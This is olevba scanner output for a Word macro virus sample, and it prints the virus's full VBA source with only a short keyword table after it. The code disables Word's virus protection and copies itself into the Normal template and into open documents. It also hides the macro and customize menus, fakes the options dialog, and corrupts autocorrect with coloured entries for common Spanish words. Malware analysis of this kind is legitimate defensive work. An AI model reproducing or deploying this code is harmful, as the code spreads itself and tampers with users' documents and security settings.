olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.bg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.bg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.VMPCK1.bg - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Fecha()
Attribute Fecha.VB_Description = "Macro creada el 16/05/99 por Germán Trudo"
Attribute Fecha.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Fecha"
'
' Fecha Macro
' Macro creada el 16/05/99 por Germán Trudo
'

End Sub
Sub Fecha2()
Attribute Fecha2.VB_Description = "Macro grabada el 16/05/99 por Germán Trudo"
Attribute Fecha2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Fecha2"
'
' Fecha2 Macro
' Macro grabada el 16/05/99 por Germán Trudo
'
    Selection.InsertDateTime DateTimeFormat:="dddd d' de 'MMMM' de 'aaaa", _
        InsertAsField:=False
    Selection.TypeText Text:=" "
    Selection.InsertDateTime DateTimeFormat:="h:mm am/pm", InsertAsField:= _
        False
End Sub
-------------------------------------------------------------------------------
VBA MACRO colorinm.bas 
in file: Virus.MSWord.VMPCK1.bg - OLE stream: 'Macros/VBA/colorinm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Options.VirusProtection = False
End Sub
Sub AutoOpen()
Dim c As Byte
On Error Resume Next
Options.VirusProtection = False
Application.EnableCancelKey = False
inf
    With CommandBars("tools")
                    .Controls(13).Enabled = False 'macro
                    .Controls(14).Enabled = False 'plantillas y complementos....
                    .Controls(15).Enabled = False  'personalizar...
    End With
CommandBars("view").Controls(6).Enabled = False 'barras de herramientas
CommandBars("edit").Controls(9).Enabled = False 'edit select all
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
CommandBars("Tools").Controls(5).OnAction = "oculta1"
CommandBars("Tools").Controls(16).OnAction = "oculta2"
ActiveDocument.Variables.Add Name:="activo?"
If Minute((Now)) >= 55 Or Minute((Now)) <= 5 Then
                                ActiveDocument.Variables("activo?") = "si"
                                Options.BlueScreen = True
                                agrega
Else: ActiveDocument.Variables("activo?") = "no"
End If
For c = 1 To CommandBars("Control Toolbox").Controls.Count
    CommandBars("Control Toolbox").Controls(1).Delete
Next c
End Sub
Sub inf()
Application.EnableCancelKey = False
On Error Resume Next
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="colorinm", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.BuiltInDocumentProperties(wdPropertyComments) = "Comentarios, sugerencias, insultos?:" + vbCr + "a a b b c d e @ y a h o o . c o m"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="colorinm", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Byte
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "colorinm" Then Nch = True
    Next
End Function
Function Dch()
Dim J As Byte
    For J = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(J).Name = "colorinm" Then Dch = True
    Next
End Function
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub oculta1()
If ActiveDocument.Variables("activo?").Value = "si" Then
borrador
Word.Dialogs.Item(wdDialogToolsAutoManager).Show
agrega
Else: Word.Dialogs.Item(wdDialogToolsAutoManager).Show
End If
End Sub
Sub oculta2()
aparentes
Word.Dialogs.Item(wdDialogToolsOptions).Show
reales
End Sub
Sub agrega()
Attribute agrega.VB_Description = "Macro grabada el 24/08/98 por MINIPHONE"
Attribute agrega.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.final"
Dim letra, color
    Selection.ParagraphFormat.Alignment = wdAlignParagraphLeft
    For vez = 1 To 24
    Select Case vez
            Case 1
                letra = "a"
                color = 7
            Case 2
                letra = "u"
                color = 4
            Case 3
                letra = "o"
                color = 3
            Case 4
                letra = "y"
                color = 6
            Case 5
                letra = "e"
                color = 5
            Case 6
                letra = "de"
                color = 7
            Case 7
                letra = "en"
                color = 4
            Case 8
                letra = "que"
                color = 3
            Case 9
                letra = "la"
                color = 6
            Case 10
                letra = "los"
                color = 5
            Case 11
                letra = "las"
                color = 7
            Case 12
                letra = "una"
                color = 4
            Case 13
                letra = "le"
                color = 5
            Case 14
                letra = "se"
                color = 7
            Case 15
                letra = "ya"
                color = 5
            Case 16
                letra = "no"
                color = 7
            Case 17
                letra = "lo"
                color = 4
            Case 18
                letra = "un"
                color = 3
            Case 19
                letra = "por"
                color = 6
            Case 20
                letra = "unos"
                color = 5
            Case 21
                letra = "para"
                color = 3
            Case 22
                letra = "si"
                color = 3
            Case 23
                letra = "es"
                color = 3
            Case 24
                letra = "con"
                color = 4
          End Select
    With Selection
            .Font.ColorIndex = color
            .TypeText Text:=letra
            .MoveLeft Unit:=wdWord, Count:=1, Extend:=wdExtend
    End With
    autocorrect.Entries.AddRichText Name:=letra, Range:=Selection.Range
 Next vez
 autocorrect.ReplaceText = True
 With Selection
    .Font.ColorIndex = wdAuto
    .Font.Name = "Courier New"
    .Font.Size = 10
    .Delete
 End With
End Sub
Sub borrador()
Attribute borrador.VB_Description = "Macro grabada el 24/08/98 por MINIPHONE"
Attribute borrador.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Macro1asasa"
On Error Resume Next
autocorrect.ReplaceText = False
With autocorrect.Entries
.Item("a").Delete
.Item("u").Delete
.Item("o").Delete
.Item("y").Delete
.Item("e").Delete
.Item("de").Delete
.Item("en").Delete
.Item("que").Delete
.Item("la").Delete
.Item("los").Delete
.Item("las").Delete
.Item("una").Delete
.Item("le").Delete
.Item("se").Delete
.Item("ya").Delete
.Item("no").Delete
.Item("lo").Delete
.Item("un").Delete
.Item("por").Delete
.Item("unos").Delete
.Item("para").Delete
.Item("si").Delete
.Item("es").Delete
.Item("con").Delete
End With
End Sub
Sub aparentes()
    With Options
        Rem .BlueScreen = False
        .VirusProtection = True
        .AllowFastSave = True
        .BackgroundSave = True
        .SaveNormalPrompt = True
    End With
End Sub
Sub reales()
On Error Resume Next
    If ActiveDocument.Variables("activo?").Value = "si" Then Options.BlueScreen = True
    With Options
        .VirusProtection = False
        .SavePropertiesPrompt = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub autonew()
AutoOpen
End Sub
Sub AutoClose()
inf
chau
End Sub
Sub FileSave()
inf
End Sub
Sub autoexit()
inf
chau
End Sub
Sub FileSaveas()
inf
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub chau()
If ActiveDocument.Variables("activo?").Value = "si" Then
        borrador
        Options.BlueScreen = False
End If
        ActiveDocument.Variables("activo?").Delete
End Sub
Sub tritri()
MsgBox (ActiveDocument.Variables("activo?").Value)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

